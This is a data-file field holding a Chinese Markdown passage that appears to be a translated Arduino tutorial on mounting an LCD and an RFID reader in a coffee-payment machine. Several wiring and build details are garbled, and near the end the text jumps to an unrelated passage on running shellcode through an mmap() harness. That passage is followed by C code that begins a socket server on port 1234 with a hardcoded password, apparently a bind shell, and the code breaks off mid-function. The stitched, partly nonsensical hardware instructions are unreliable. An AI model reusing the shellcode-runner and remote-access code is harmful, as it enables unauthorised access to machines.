  mdcn: "\n\n## 编写 LCD 程序\n\n此时，你的分发机制应该已经基本完成，并且在机器中间的一列上运行。现在是时候添加用户反馈和输入了。机器应该能够告诉用户机器的状态，例如登录是否成功。你可以通过\
    \ LCD 显示器轻松地实现这一点。\n\n在 Arduino Sketch 代码中，在代码顶部添加一行来访问 LCD 库，并添加另一行来初始化 LCD 对象：\n\
    \n```cpp\n#include <LiquidCrystal.h>\nLiquidCrystal lcd(RS, E, D5, D6, D7, D8);\n\
    ```\n\n在上面的代码段中，连接需要连接到 Arduino 数字引脚的 LCD。RW（读/写）、VO（对比度）和 VSS（地）应连接到 GND，而 VDD（5V）应连接到处于高电平的数字引脚（SPI\
    \ 引脚已被电机占用）。\n\n在 `setup()` 函数中，你必须初始化 LCD 并设置显示器的列数和行数：\n\n```cpp\nlcd.begin(cols,\
    \ rows);\n```\n\n在 `loop()` 的最顶部，当 Arduino 正在等待读取 RFID 卡时，你可以向显示器写入消息，告诉用户机器正在使用中。将光标设置为你想要的位置并向其写入字符串：\n\
    \n```cpp\nlcd.setCursor(col, row);\nlcd.print(\"Ready to read\");\n```\n\n在 `loop()`\
    \ 的其余部分，你可以添加显示用户账户余额的消息（如果由 RaspiPay 提供），或者消息“硬币不足。不允许继续制作咖啡”。\n\n## 安装显示器\n\n\
    编写好 LCD 后，是时候将其安装到机器上了。考虑到可能出现的情况，在背部设计一个维修门可能是一个好主意。你还需要留出访问或更换备件的方法。\n\n这一点现在非常相关，因为你需要在框架的侧面开一个洞。使用\
    \ LCD 刀和两个螺丝，在盒子的前端切出一个与 LCD 显示器宽度完全相同但略小的孔。孔应该位于中间列的侧面或下方。然后，你应该能够将屏幕放置在框架之外。LCD\
    \ 安装的电路板，使用胶带将其固定在内部并压在框架上。确保它固定在位置——直到足够牢固。由于你使用的是 Arduino，LCD 连接到相应的数字引脚。\n\n\
    RFID 读器可以放置在距离外壳表面 5cm 处。\n\n## 添加读卡器\n\n回到需要提醒 RFID 读器的地方。使用跳线线将 RFID 端子连接到 SPI（串行外设）接口。不需要面包板。正如在\
    \ LU18 中讨论的，Arduino 的 SPI 模块之一连接到数字引脚 11-13，如下所示：MISO、MOSI、SCK 和 SS，复位连接到 54。你还需要使用\
    \ Arduino 的 3.3V 连接，并将 GND 连接到 Arduino 的地引脚。\n\n将 RFID 固定在板子前端并将其贴在内部。读器可以在一定距离内与其他通信，这通过纸板和塑料是可以实现的。通过金属等导电材料（电磁屏蔽）进行通信将更加困难。\n\
    \n如果安装得不好，你可以在框架上移动它，或者使用电机使其旋转并让 LCD 更新消息。剩下的工作只是是在咖啡顶部添加一个盖子，并用某种图表指示在盒子的哪个位置展示卡片。在使用你的新咖啡之前，或者在你用了一些之后，你可能想要改进设计并让机器更坚固。通过少量的工作、3D\
    \ 打印或其他技术，可以制造一台坚固的机器并为你的同事服务。\n\n如果你读过关于编写和测试 shellcode 的文章，你将使用一个 C 语言的支架（如下所示）。此代码允许你在执行时避免段错误。还有另一种方法：你可以使用\
    \ `mmap()` 将 shellcode 映射到内存页并授予其权限。这样你就可以像往常一样编译代码，它将完美地运行。\n\n```c\n#include\
    \ <stdio.h>\n#include <string.h>\n#include <unistd.h>\n#include <sys/socket.h>\n\
    #include <netinet/in.h>\n#include <arpa/inet.h>\n#include <stdlib.h>\n\n#define\
    \ PASSWORD \"secret\"\n#define PORT 1234\n\nint main() {\n    int server_fd, client_fd;\n\
    \    struct sockaddr_in address;\n    int len = sizeof(address);\n    char buffer[1024]\
